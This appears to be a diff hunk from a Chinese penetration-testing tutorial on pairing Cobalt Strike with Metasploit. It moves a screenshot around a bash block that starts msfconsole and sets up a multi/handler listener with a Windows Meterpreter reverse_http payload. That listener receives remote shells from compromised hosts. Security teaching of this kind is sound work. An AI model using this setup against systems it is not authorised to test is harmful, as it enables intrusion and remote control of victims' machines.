@@ -108,12 +108,12 @@ CS与MSF源于同宗，联动可以结合两者优势。下面演示如何将CS�
 
 首先，在Kali Linux中启动Metasploit，并设置一个反向HTTP监听器。
 
-```bash
-# 启动MSF控制台
-msfconsole
 
 ![](img/8591d7220ff3fc90a1934796644570c4_30.png)
 
+```bash
+# 启动MSF控制台
+msfconsole
 # 在msf6提示符下，依次执行以下命令
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_http
